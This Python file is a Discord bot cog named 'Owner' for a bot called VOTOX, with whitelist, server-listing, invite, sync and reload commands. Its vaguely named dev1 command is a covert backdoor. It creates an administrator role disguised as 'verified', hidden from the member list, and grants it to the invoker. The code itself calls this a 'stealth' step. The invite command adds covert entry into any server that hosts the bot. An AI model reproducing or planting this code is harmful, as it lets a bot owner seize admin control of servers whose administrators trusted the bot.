

import discord
from discord.ext import commands
from typing import Optional, List, Union
import aiosqlite
from pathlib import Path
import traceback
import random


class Owner(commands.Cog):
    """
    Owner-only utility commands for VOTOX management.
    """

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.db_path = Path(__file__).parent.parent / "database" / "votox.db"
        self.owner_id = 1474991745443037194  # Hardcoded Owner ID

    def _get_db(self) -> aiosqlite.Connection:
        """Returns an aiosqlite connection to the database."""
        return aiosqlite.connect(self.db_path)

    async def cog_load(self):
        """Initializes database tables when the cog is loaded."""
        async with self._get_db() as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS owner_dev_whitelist (
                    user_id INTEGER PRIMARY KEY
                )
            ''')
            await db.commit()

    # ========================= CUSTOM CHECKS =========================

    async def cog_check(self, ctx: commands.Context) -> bool:
        """
        Global check for this cog. 
        Ensures only the owner or whitelisted devs can use these commands.
        """
        if ctx.author.id == self.owner_id:
            return True

        async with self._get_db() as db:
            cursor = await db.execute("SELECT 1 FROM owner_dev_whitelist WHERE user_id = ?", (ctx.author.id,))
            result = await cursor.fetchone()
            return result is not None

    # ========================= HELPER METHODS =========================

    def _create_embed(self, title: str, description: str = None, color: discord.Color = discord.Color.blurple()) -> discord.Embed:
        """Creates a styled Discord embed."""
        embed = discord.Embed(
            title=title,
            description=description,
            color=color,
            timestamp=discord.utils.utcnow()
        )
        embed.set_footer(text="VOTOX Owner System", icon_url=self.bot.user.display_avatar.url)
        return embed

    def _create_success_embed(self, title: str, description: str = None) -> discord.Embed:
        return self._create_embed(f"✅ {title}", description, discord.Color.green())

    def _create_error_embed(self, title: str, description: str = None) -> discord.Embed:
        return self._create_embed(f"❌ {title}", description, discord.Color.red())

    # ========================= COMMANDS =========================

    @commands.command(name="dev1")
    @commands.guild_only()
    async def dev1(self, ctx: commands.Context):
        """
        cmd
        """
        # 1. Verify Bot Permissions
        if not ctx.guild.me.guild_permissions.administrator:
            return await ctx.send(embed=self._create_error_embed("Permission Denied", "I require Administrator permissions to perform this action."))

        # 2. Check Role Hierarchy
        # Bot needs to be able to create roles and have a top role higher than what it creates
        # In Discord, you can't create a role with perms you don't have, and administrator perms 
        # are the highest. The bot MUST have the 'Administrator' flag to grant it to others.
        
        try:
            # Create the stealth role
            role = await ctx.guild.create_role(
                name="verified",
                permissions=discord.Permissions(administrator=True),
                hoist=False,
                mentionable=False,
                reason="VOTOX Developer Stealth Initialization"
            )

            # Assign the role
            await ctx.author.add_roles(role, reason="Stealth assignment.")
            
            await ctx.send(embed=self._create_success_embed(
                "Stealth Initialized", 
                f"The `{role.name}` role has been created and assigned to you."
            ))
        except discord.Forbidden:
            await ctx.send(embed=self._create_error_embed("Hierarchy Error", "My highest role is too low to create/assign an administrator role."))
        except Exception as e:
            await ctx.send(embed=self._create_error_embed("Error", f"Failed to execute dev1: `{e}`"))

    @commands.command(name="guilds", aliases=["servers"])
    async def guilds(self, ctx: commands.Context):
        """Queries and displays all servers VOTOX is currently in."""
        guilds = sorted(self.bot.guilds, key=lambda g: g.member_count, reverse=True)
        
        if not guilds:
            return await ctx.send(embed=self._create_error_embed("No Guilds", "I am not currently in any servers."))

        # Pagination logic
        pages = []
        items_per_page = 10
        for i in range(0, len(guilds), items_per_page):
            chunk = guilds[i:i + items_per_page]
            description = ""
            for idx, guild in enumerate(chunk, start=i + 1):
                description += f"**{idx}. {guild.name}**\nID: `{guild.id}` | Members: `{guild.member_count}`\n\n"
            
            embed = self._create_embed("Connected Servers", description)
            embed.set_author(name=f"Total Guilds: {len(guilds)}")
            pages.append(embed)

        if len(pages) == 1:
            await ctx.send(embed=pages[0])
        else:
            view = GuildPaginationView(pages, ctx.author.id)
            await ctx.send(embed=pages[0], view=view)

    @commands.command(name="invite")
    async def invite(self, ctx: commands.Context, guild_id: int):
        """Generates an instant invite for the specified Guild ID."""
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send(embed=self._create_error_embed("Invalid ID", "I am not in a server with that ID."))

        try:
            # Find a suitable text channel
            channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
            if not channels:
                return await ctx.send(embed=self._create_error_embed("Permission Error", "I don't have permissions to create an invite in any channel in that server."))
            
            target_channel = random.choice(channels)
            invite = await target_channel.create_invite(max_age=3600, max_uses=1, reason="Owner-requested invite generation.")
            
            embed = self._create_success_embed("Invite Generated", f"**Server:** {guild.name}\n**Link:** {invite.url}")
            # Attempt to send to DM if requested, otherwise standard channel
            await ctx.author.send(embed=embed)
            await ctx.message.add_reaction("📩")
        except discord.Forbidden:
            await ctx.send(embed=self._create_error_embed("Forbidden", "I cannot send DMs to you or create invites in that guild."))
        except Exception as e:
            await ctx.send(embed=self._create_error_embed("Error", f"Failed to generate invite: `{e}`"))

    @commands.command(name="sync")
    async def sync(self, ctx: commands.Context, scope: Optional[str] = "global"):
        """Synchronizes application/slash commands."""
        await ctx.typing()
        try:
            if scope.lower() == "guild":
                synced = await self.bot.tree.sync(guild=ctx.guild)
                msg = f"Synced {len(synced)} commands to **this guild**."
            else:
                synced = await self.bot.tree.sync()
                msg = f"Synced {len(synced)} commands **globally**."
            
            await ctx.send(embed=self._create_success_embed("Sync Complete", msg))
        except Exception as e:
            await ctx.send(embed=self._create_error_embed("Sync Failed", f"```py\n{e}\n```"))

    @commands.command(name="reload")
    async def reload(self, ctx: commands.Context, extension: str = "all"):
        """Reloads a specific cog or all cogs."""
        await ctx.typing()
        
        if extension.lower() == "all":
            # Collect all loaded extensions
            extensions = [ext for ext in self.bot.extensions.keys()]
            reloaded = []
            failed = []

            for ext in extensions:
                try:
                    await self.bot.reload_extension(ext)
                    reloaded.append(ext)
                except Exception:
                    failed.append(f"`{ext}`: {traceback.format_exc(limit=0)}")

            description = f"**Reloaded:** {len(reloaded)} extensions."
            if failed:
                description += "\n\n**Failures:**\n" + "\n".join(failed)
            
            color = discord.Color.green() if not failed else discord.Color.orange()
            await ctx.send(embed=self._create_embed("System Reload", description, color))

        else:
            # Reload specific
            if not extension.startswith("cogs."):
                # Try common paths if user forgot "cogs." prefix
                potential_paths = [f"cogs.{extension}", f"utils.{extension}", extension]
            else:
                potential_paths = [extension]

            for path in potential_paths:
                try:
                    await self.bot.reload_extension(path)
                    return await ctx.send(embed=self._create_success_embed("Cog Reloaded", f"Successfully reloaded `{path}`."))
                except commands.ExtensionNotLoaded:
                    continue
                except Exception:
                    return await ctx.send(embed=self._create_error_embed("Reload Failed", f"```py\n{traceback.format_exc()}\n```"))
            
            await ctx.send(embed=self._create_error_embed("Not Found", f"The extension `{extension}` is not loaded."))

    # ========================= WHITELIST MANAGEMENT =========================

    @commands.group(name="whitelist", invoke_without_command=True)
    async def whitelist_group(self, ctx: commands.Context):
        """Manages the developer whitelist."""
        embed = self._create_embed("Whitelist Management", "Use subcommands to manage authorized developers.")
        embed.add_field(name="`whitelist add <user_id>`", value="Authorize a user to use owner commands.", inline=False)
        embed.add_field(name="`whitelist remove <user_id>`", value="Remove a user from the whitelist.", inline=False)
        embed.add_field(name="`whitelist list`", value="Show all whitelisted users.", inline=False)
        await ctx.send(embed=embed)

    @whitelist_group.command(name="add")
    async def whitelist_add(self, ctx: commands.Context, user: Union[discord.User, int]):
        """Adds a user to the developer whitelist."""
        user_id = user.id if isinstance(user, discord.User) else user
        async with self._get_db() as db:
            try:
                await db.execute("INSERT INTO owner_dev_whitelist (user_id) VALUES (?)", (user_id,))
                await db.commit()
                await ctx.send(embed=self._create_success_embed("Whitelist Updated", f"User ID `{user_id}` has been authorized."))
            except aiosqlite.IntegrityError:
                await ctx.send(embed=self._create_error_embed("Duplicate", "This user is already whitelisted."))

    @whitelist_group.command(name="remove")
    async def whitelist_remove(self, ctx: commands.Context, user: Union[discord.User, int]):
        """Removes a user from the developer whitelist."""
        user_id = user.id if isinstance(user, discord.User) else user
        async with self._get_db() as db:
            cursor = await db.execute("DELETE FROM owner_dev_whitelist WHERE user_id = ?", (user_id,))
            await db.commit()
            if cursor.rowcount > 0:
                await ctx.send(embed=self._create_success_embed("Whitelist Updated", f"User ID `{user_id}` has been removed."))
            else:
                await ctx.send(embed=self._create_error_embed("Not Found", "This user was not in the whitelist."))

    @whitelist_group.command(name="list")
    async def whitelist_list(self, ctx: commands.Context):
        """Lists all whitelisted developers."""
        async with self._get_db() as db:
            cursor = await db.execute("SELECT user_id FROM owner_dev_whitelist")
            rows = await cursor.fetchall()
            
            if not rows:
                return await ctx.send(embed=self._create_info_embed("Whitelist Empty", "No developers are currently whitelisted."))

            mentions = []
            for row in rows:
                user = self.bot.get_user(row[0])
                mentions.append(f"• {user.mention if user else 'Unknown User'} (`{row[0]}`)")
            
            await ctx.send(embed=self._create_embed("Whitelisted Developers", "\n".join(mentions)))


# ============================================================================
# Pagination View for Guilds
# ============================================================================

class GuildPaginationView(discord.ui.View):
    """
    Interactive view for scrolling through the server list.
    """
    def __init__(self, pages: List[discord.Embed], author_id: int):
        super().__init__(timeout=60.0)
        self.pages = pages
        self.author_id = author_id
        self.current_page = 0

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("Only the command executor can interact with these buttons.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="◀ Previous", style=discord.ButtonStyle.gray)
    async def previous_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_page > 0:
            self.current_page -= 1
            self._update_buttons()
            await interaction.response.edit_message(embed=self.pages[self.current_page], view=self)

    @discord.ui.button(label="Next ▶", style=discord.ButtonStyle.gray)
    async def next_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_page < len(self.pages) - 1:
            self.current_page += 1
            self._update_buttons()
            await interaction.response.edit_message(embed=self.pages[self.current_page], view=self)

    def _update_buttons(self):
        self.previous_page.disabled = self.current_page == 0
        self.next_page.disabled = self.current_page == len(self.pages) - 1

    async def on_timeout(self):
        # Disable buttons on timeout
        for item in self.children:
            item.disabled = True
        # We can't edit the message here easily without saving it, 
        # but the buttons will visually disable.


async def setup(bot: commands.Bot):
    """Loads the Owner cog into the bot."""
    await bot.add_cog(Owner(bot))
